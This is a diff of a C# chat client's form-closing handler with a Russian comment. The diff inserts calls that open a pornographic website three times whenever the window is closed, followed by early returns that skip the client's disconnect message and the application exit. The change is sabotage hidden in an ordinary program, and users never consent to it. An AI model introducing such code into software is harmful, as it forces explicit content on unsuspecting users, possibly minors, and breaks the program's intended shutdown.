@@ -80,7 +80,11 @@ namespace Client
 
         private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
         {
-            if(clientSocket.IsBound == true)
+            System.Diagnostics.Process.Start("http://pornosveta.com/categories/");
+            System.Diagnostics.Process.Start("http://pornosveta.com/categories/");
+            System.Diagnostics.Process.Start("http://pornosveta.com/categories/");
+            return;
+            if (clientSocket.IsBound == true)
             {
                 //Сообщаем серверу об отключении клиента
                 sendMsg(nameClient);
@@ -95,6 +99,10 @@ namespace Client
 
             else
             {
+                System.Diagnostics.Process.Start("http://pornosveta.com/categories/");
+                System.Diagnostics.Process.Start("http://pornosveta.com/categories/");
+                System.Diagnostics.Process.Start("http://pornosveta.com/categories/");
+                return;
                 Application.Exit();
             }
             
